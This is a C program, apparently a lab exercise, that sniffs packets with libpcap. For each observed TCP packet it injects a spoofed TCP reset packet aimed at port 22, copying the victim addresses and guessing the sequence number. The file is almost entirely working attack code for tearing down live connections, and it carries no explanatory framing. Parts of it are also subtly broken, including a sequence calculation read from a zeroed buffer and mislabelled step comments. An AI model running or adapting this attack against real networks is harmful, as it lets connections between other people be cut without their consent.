#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netinet/udp.h>
#include <sys/socket.h>

#include "myheader.h"

#define  BUFSIZE 1500

void process_ip(struct ipheader* ip);

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  struct ethheader *eth = (struct ethheader *)packet;
  if (ntohs(eth->ether_type) == 0x0800) 
      process_ip((struct ipheader*)(packet + SIZE_ETHERNET));
};
 
int main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
 // char filter_exp[] = "telnet";
  // Don't sniff the packet from/to the specified ether address
  //char filter_exp[] = "not (ether host 08:00:27:c5:79:5f)";
 char filter_exp[] = "";
  bpf_u_int32 net; 

  //Open live pcap session on NIC with name eth0
  handle = pcap_open_live("eth14", BUFSIZ, 1, 1000, errbuf);    

  //Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net); 

  pcap_setfilter(handle, &fp); //Setup BPF code on the socket
  pcap_loop(handle, -1, got_packet, NULL); //Capture packets
  pcap_close(handle);   //Close the handle 
  return 0;
}

void process_ip(struct ipheader* ipGiven)
{
    int ip_header_len = ipGiven->iph_ihl * 4;

    printf("-------------------------------------\n");
    /* print source and destination IP addresses */
    printf("       From: %s\n", inet_ntoa(ipGiven->iph_sourceip));
    printf("         To: %s\n", inet_ntoa(ipGiven->iph_destip));



    u_char *header = ((u_char *) ipGiven) + ip_header_len;



//struct tcpheader *tcp = (struct tcpheader *) (ip + sizeof(struct ipheader));
struct tcpheader *tcpGiven = (struct tcpheader *)header;
int total = 0;




    /* determine protocol */
    switch(ipGiven->iph_protocol) {
        case IPPROTO_TCP:
            printf("   Protocol: TCP\n");
            //total = (int)(ip->iph_len - sizeof(struct ipheader) - sizeof(struct tcpheader)) +   (tcp->tcp_seq);
            printf("Sequence Number %lu\n", ntohl(tcpGiven->tcp_seq));
            printf("Total Length is %hu\n", ipGiven->iph_len);
            printf("Size of ipheader is %i\n", sizeof(struct ipheader));
            printf("Size of tcpheader is %i\n", sizeof(struct tcpheader));
            printf("Next sequence number %i", (uint32_t)(ipGiven->iph_len - sizeof(struct ipheader) -sizeof(struct tcpheader) + ntohl(tcpGiven->tcp_seq)));
//need a source port
//need a sequence number

//check the negative numbersl

            
char buffer[PACKET_LEN];
  

   /*********************************************************
      Step 1: Fill in the ICMP header.
    ********************************************************/
struct ipheader *ip = (struct ipheader *) buffer;
struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));

   memset(buffer, 0, PACKET_LEN);
   //actually clears it
   /*********************************************************
      Step 2: Fill in the IP header.
    ********************************************************/
tcp->tcp_sport = tcpGiven->tcp_sport; //rand()
tcp->tcp_dport = htons(22); //atoi()
tcp->tcp_seq = htonl((uint32_t)(ip->iph_len - sizeof(struct ipheader) -sizeof(struct tcpheader) + ntohl(tcpGiven->tcp_seq))); //rand()
tcp->tcp_offx2 = 0x50;
tcp->tcp_flags = 0x4;
tcp->tcp_win = htons(20000);
tcp->tcp_sum = 0;

ip->iph_ver = 4;
ip->iph_ihl = 5;
ip->iph_ttl = 20;

ip->iph_sourceip.s_addr = ipGiven->iph_sourceip.s_addr;
//inet_addr(SRC_IP);
ip->iph_destip.s_addr = ipGiven->iph_destip.s_addr;
ip->iph_protocol = IPPROTO_TCP;
ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));


struct pseudo_tcp fake;
memset(&fake, 0, sizeof(struct pseudo_tcp));
//memset instead of
fake.saddr = ip->iph_sourceip.s_addr; //get actuall ones
fake.daddr = ip->iph_destip.s_addr;
fake.mbz = 0;
fake.ptcl = IPPROTO_TCP;
fake.tcpl = htons(sizeof(struct tcpheader));

//fake.tcp = *tcp;

//fake.payload = buffer;
memcpy(&fake.tcp, tcp, sizeof(struct tcpheader));

tcp->tcp_sum = in_cksum((unsigned short*) &fake, sizeof(struct pseudo_tcp));

   // ip->iph_chksum = ...;

   /*********************************************************
      Step 3: Finally, send the spoofed packet
    ********************************************************/
//fclose(stdout);


   send_raw_ip_packet (ip);




                                            //(total length -  size of iph_protocol  -   size of tcp        ) + sequence nubmer
         //   printf();
            //substract from length size of struct ip head and size of struct tcp header, and add to sequence
            return;
        case IPPROTO_UDP:
           // printf("   Protocol: UDP\n");
            return;
        case IPPROTO_ICMP:
          //  printf("   Protocol: ICMP\n");
            return;
        case IPPROTO_IP:
           /// printf("   Protocol: IP\n");
            return;
        default:
            printf("   Protocol: unknown\n");
            return;
    }


}


